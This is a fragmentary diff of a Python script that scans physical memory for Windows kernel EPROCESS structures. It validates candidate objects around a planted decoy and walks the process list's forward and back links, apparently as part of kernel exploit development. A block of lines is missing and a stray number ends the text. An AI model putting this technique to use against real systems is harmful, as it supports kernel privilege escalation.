@@ -1,0 +1,88 @@
+﻿  60|
+  61|def prog(s):
+  62|    try:
+  63|        with open(PROG, "a", encoding="utf-8") as f:
+  64|            f.write("%s  %s\n" % (time.strftime("%H:%M:%S"), s))
+  65|            f.flush()
+  66|            os.fsync(f.fileno())
+  67|    except OSError:
+  68|        pass
+  69|
+  70|
+  71|def shape(p):
+  72|    """Real neighbour EPROCESS at page offset 0 -> (pid, fl, bl) or None.
+  73|
+  74|    p44d: the base is page aligned and the live links are at +0x258, so the
+  75|    object starts at p[0].  The 0x080 phase chainprobe guessed is measured
+  76|    against the decoy itself (offset 0xC0), not against the neighbours.
+  77|    """
+  78|    if p[0] != 3:
+  79|        return None
+  80|    pid = struct.unpack_from("<I", p, OBJ_PID)[0]
+  81|    if not (0 < pid <= 0x100000):
+  82|        return None
+  83|    fl, bl = struct.unpack_from("<QQ", p, OBJ_LINK)
+  84|    if fl >> 48 != 0xFFFF or bl >> 48 != 0xFFFF:
+  85|        return None
+  86|    if (fl & 0xFFF) != OBJ_LINK or (bl & 0xFFF) != OBJ_LINK + 8:
+  87|        return None
+  88|    nm = p[OBJ_NAME:OBJ_NAME + 15]
+  89|    if nm == b"\x00" * 15 or not all(0x20 <= c < 0x7F for c in nm):
+  90|        return None
+  91|    return pid, fl, bl
+  92|
+  93|
+  94|def wr(code, verdict):
+  95|    log("VERDICT: %s" % verdict)
+  96|    open(OUT, "w", encoding="utf-8").write("\n".join(LOG) + "\n")
+  97|    return code
+  98|
+  99|
+ 100|def decoy_read(g, b, pa):
+ 101|    """Read the decoy through candidate B and verify reciprocity.
+ 102|
+ 103|    The decoy is validated at its *own* phase 0xC0 (p44d), and the two values
+ 104|    it returns are compared against the walk starts p44d recorded.
+ 105|    """
+ 205|        log("range %#x..%#x done %.1fs" % (rlo, rhi, time.perf_counter() - rt))
+ 206|    log("no candidate  tried=%d shapes=%d %.1fs"
+ 207|        % (tried, shapes, time.perf_counter() - t0))
+ 208|    return None, None, "none"
+ 209|
+ 210|
+ 211|def hop(g, b, va, seen):
+ 212|    """VA -> (pid, base_pa, fl, bl, name) for a list node, or None.
+ 213|
+ 214|    p44d: the node VA is base+0x258, so the object starts at pa-0x258 -- NOT the
+ 215|    -0x1d8 lane the decoy's fake LINK_ENTRY sits on.
+ 216|    """
+ 217|    base = va - b - OBJ_LINK
+ 218|    o = base & 0xFFF
+ 219|    if base in seen or not g.is_ram(base) or o > 0xCA0:
+ 220|        return None
+ 221|    seen.add(base)
+ 222|    try:
+ 223|        p = g.read_phys(base - o, 0x1000)
+ 224|    except OSError:
+ 225|        return None
+ 226|    if p[o] != 3:
+ 227|        return None
+ 228|    pid = struct.unpack_from("<I", p, o + OBJ_PID)[0]
+ 229|    fl, bl = struct.unpack_from("<QQ", p, o + OBJ_LINK)
+ 230|    return pid, base, fl, bl, p[o + OBJ_NAME:o + OBJ_NAME + 15]
+ 231|
+ 232|
+ 233|def walk(g, b, start_va, seen, tag):
+ 234|    """Follow one direction; collect (pid, base, name) until HOP_CAP or a repeat."""
+ 235|    va = start_va
+ 236|    out = []
+ 237|    for i in range(HOP_CAP):
+ 238|        h = hop(g, b, va, seen)
+ 239|        if not h:
+ 240|            out.append(("dead", va))
+ 241|            break
+ 242|        pid, base, fl, bl, nm = h
+ 243|        out.append((pid, base, nm))
+ 244|        prog("%s hop%d pid=%#x base=%#x name=%r" % (tag, i, pid, base, nm))
+ 245|        nxt = fl if tag == "FL" else bl
+353
